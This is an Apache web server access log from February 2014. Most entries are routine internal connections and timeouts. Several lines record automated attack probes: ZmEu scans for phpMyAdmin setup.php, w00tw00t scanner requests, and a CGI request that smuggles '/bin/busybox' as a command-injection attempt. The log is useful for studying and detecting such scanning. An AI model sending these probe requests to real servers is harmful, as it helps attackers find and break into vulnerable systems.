::1 - - [17/Feb/2014:09:47:00 +0200] "OPTIONS * HTTP/1.0" 200 152 "-" "Apache/2.2.16 (Debian) (internal dummy connection)"
::1 - - [17/Feb/2014:09:47:26 +0200] "OPTIONS * HTTP/1.0" 200 152 "-" "Apache/2.2.16 (Debian) (internal dummy connection)"
::1 - - [17/Feb/2014:09:48:26 +0200] "OPTIONS * HTTP/1.0" 200 152 "-" "Apache/2.2.16 (Debian) (internal dummy connection)"
::1 - - [17/Feb/2014:09:48:43 +0200] "OPTIONS * HTTP/1.0" 200 152 "-" "Apache/2.2.16 (Debian) (internal dummy connection)"
139.130.63.10 - - [17/Feb/2014:10:28:00 +0200] "-" 408 0 "-" "-"
::1 - - [17/Feb/2014:10:30:07 +0200] "OPTIONS * HTTP/1.0" 200 152 "-" "Apache/2.2.16 (Debian) (internal dummy connection)"
139.130.63.10 - - [17/Feb/2014:10:30:11 +0200] "-" 408 0 "-" "-"
::1 - - [17/Feb/2014:10:30:14 +0200] "OPTIONS * HTTP/1.0" 200 152 "-" "Apache/2.2.16 (Debian) (internal dummy connection)"
::1 - - [17/Feb/2014:15:10:39 +0200] "OPTIONS * HTTP/1.0" 200 152 "-" "Apache/2.2.16 (Debian) (internal dummy connection)"
::1 - - [17/Feb/2014:15:10:40 +0200] "OPTIONS * HTTP/1.0" 200 152 "-" "Apache/2.2.16 (Debian) (internal dummy connection)"
82.79.51.38 - - [17/Feb/2014:15:10:44 +0200] "-" 408 0 "-" "-"
::1 - - [17/Feb/2014:15:10:46 +0200] "OPTIONS * HTTP/1.0" 200 152 "-" "Apache/2.2.16 (Debian) (internal dummy connection)"
82.79.51.38 - - [17/Feb/2014:15:11:41 +0200] "-" 408 0 "-" "-"
82.79.51.38 - - [17/Feb/2014:15:11:46 +0200] "-" 408 0 "-" "-"
82.79.51.38 - - [17/Feb/2014:15:11:46 +0200] "-" 408 0 "-" "-"
82.79.51.38 - - [17/Feb/2014:15:11:46 +0200] "-" 408 0 "-" "-"
::1 - - [17/Feb/2014:15:11:59 +0200] "OPTIONS * HTTP/1.0" 200 152 "-" "Apache/2.2.16 (Debian) (internal dummy connection)"
82.79.51.38 - - [17/Feb/2014:15:20:55 +0200] "-" 408 0 "-" "-"
115.78.236.174 - - [17/Feb/2014:18:26:12 +0200] "GET /w00tw00t.at.ISC.SANS.DFind:) HTTP/1.1" 400 512 "-" "-"
189.46.98.95 - - [17/Feb/2014:19:51:40 +0200] "GET / HTTP/1.1" 200 484 "http://194.102.231.8/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Q312461)"
::1 - - [17/Feb/2014:22:27:34 +0200] "OPTIONS * HTTP/1.0" 200 152 "-" "Apache/2.2.16 (Debian) (internal dummy connection)"
::1 - - [17/Feb/2014:22:27:35 +0200] "OPTIONS * HTTP/1.0" 200 152 "-" "Apache/2.2.16 (Debian) (internal dummy connection)"
::1 - - [17/Feb/2014:22:27:36 +0200] "OPTIONS * HTTP/1.0" 200 152 "-" "Apache/2.2.16 (Debian) (internal dummy connection)"
::1 - - [17/Feb/2014:23:02:09 +0200] "OPTIONS * HTTP/1.0" 200 152 "-" "Apache/2.2.16 (Debian) (internal dummy connection)"
::1 - - [17/Feb/2014:23:03:13 +0200] "OPTIONS * HTTP/1.0" 200 152 "-" "Apache/2.2.16 (Debian) (internal dummy connection)"
::1 - - [17/Feb/2014:23:03:42 +0200] "OPTIONS * HTTP/1.0" 200 152 "-" "Apache/2.2.16 (Debian) (internal dummy connection)"
85.70.193.22 - - [17/Feb/2014:23:38:43 +0200] "-" 408 0 "-" "-"
85.70.193.22 - - [17/Feb/2014:23:39:21 +0200] "-" 408 0 "-" "-"
171.112.182.250 - - [17/Feb/2014:23:51:02 +0200] "GET /cgi-bin/rtpd.cgi?/bin/busybox HTTP/1.0" 404 496 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1700.107 Safari/537.36"
115.238.101.45 - - [18/Feb/2014:00:22:00 +0200] "GET /w00tw00t.at.blackhats.romanian.anti-sec:) HTTP/1.1" 404 488 "-" "ZmEu"
115.238.101.45 - - [18/Feb/2014:00:22:01 +0200] "GET /phpMyAdmin/scripts/setup.php HTTP/1.1" 404 478 "-" "ZmEu"
115.238.101.45 - - [18/Feb/2014:00:22:03 +0200] "GET /phpmyadmin/scripts/setup.php HTTP/1.1" 404 478 "-" "ZmEu"
115.238.101.45 - - [18/Feb/2014:00:22:04 +0200] "GET /pma/scripts/setup.php HTTP/1.1" 404 473 "-" "ZmEu"
115.238.101.45 - - [18/Feb/2014:00:22:05 +0200] "GET /myadmin/scripts/setup.php HTTP/1.1" 404 476 "-" "ZmEu"
115.238.101.45 - - [18/Feb/2014:00:22:05 +0200] "GET /MyAdmin/scripts/setup.php HTTP/1.1" 404 477 "-" "ZmEu"
54.197.237.105 - - [18/Feb/2014:00:58:43 +0200] "HEAD / HTTP/1.0" 200 276 "-" "-"
